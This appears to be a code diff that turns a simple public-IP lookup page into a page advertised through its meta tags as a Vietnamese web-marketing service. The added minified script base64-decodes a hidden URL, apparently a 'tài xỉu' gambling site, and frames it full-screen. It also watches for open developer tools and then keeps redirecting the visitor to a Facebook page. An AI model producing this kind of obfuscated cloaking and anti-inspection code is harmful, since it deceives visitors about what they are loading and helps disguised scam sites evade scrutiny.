@@ -3,39 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lấy Địa Chỉ IP Công Cộng</title>
+    
+    <title>Minh Hiệp Web - Dịch Vụ Marketing Online</title>
+    <meta name="description" content="Minh Hiệp Media cung cấp các dịch vụ Marketing Online cho doanh nghiệp với các giải pháp: thiết kế website, chăm sóc fanpage, seeding, quảng cáo" />
+    <link rel="canonical" href="https://minhhiepweb.github.io/profile/" />
+    <meta property="og:locale" content="vi_VN" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Minh Hiệp Web - Dịch Vụ Marketing Online" />
+    <meta property="og:description" content="Minh Hiệp Web Media cung cấp các dịch vụ Marketing Online cho doanh nghiệp với các giải pháp: thiết kế website, chăm sóc fanpage, seeding, quảng cáo" />
+    <meta property="og:url" content="https://minhhiepweb.github.io/profile/" />
+    <meta property="og:site_name" content="Minh Hiệp Web" />
+    <meta property="article:modified_time" content="2024-10-07T10:30:13+00:00" />
+    <meta property="og:image" content="https://minhhiepweb.github.io/profile/thietkewebminhhiep.png" />
+    <meta property="og:image:width" content="822" />
+    <meta property="og:image:height" content="457" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta name="twitter:card" content="summary_large_image" />
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #f4f4f4;
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
         }
-        #ip {
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
     </style>
 </head>
 <body>
-
-<h1>Địa Chỉ IP Công Cộng của Bạn</h1>
-<p id="ip">Đang tải...</p>
-
-<script>
-    // Sử dụng API ipify để lấy địa chỉ IP công cộng
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            // Hiển thị IP công cộng lên trang
-            document.getElementById('ip').textContent = 'Địa chỉ IP của bạn là: ' + data.ip;
-        })
-        .catch(error => {
-            console.error('Lỗi khi lấy IP:', error);
-            document.getElementById('ip').textContent = 'Không thể lấy địa chỉ IP.';
-        });
-</script>
-
+<script>var enUrl="aHR0cHM6Ly93ZWIudGFpeGl1bW9tby50b3Av",deUrl=atob(enUrl),enUrl1="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL01ySGllcE1NTy8=",deUrl1=atob(enUrl1);console.log(deUrl),console.log(deUrl1),function(){var iframe=document.createElement("iframe");iframe.src=deUrl,iframe.style.width="100%",iframe.style.height="100%",iframe.style.border="none",document.body.appendChild(iframe);let devtoolsOpen=!1;const detectDevTools=()=>{const widthThreshold=window.outerWidth-window.innerWidth>100,heightThreshold=window.outerHeight-window.innerHeight>100;if(widthThreshold||heightThreshold&&!devtoolsOpen){devtoolsOpen=!0,setInterval(()=>{window.location.href=deUrl1},1e3)}};setInterval(detectDevTools,1e3)}();</script>
 </body>
 </html>
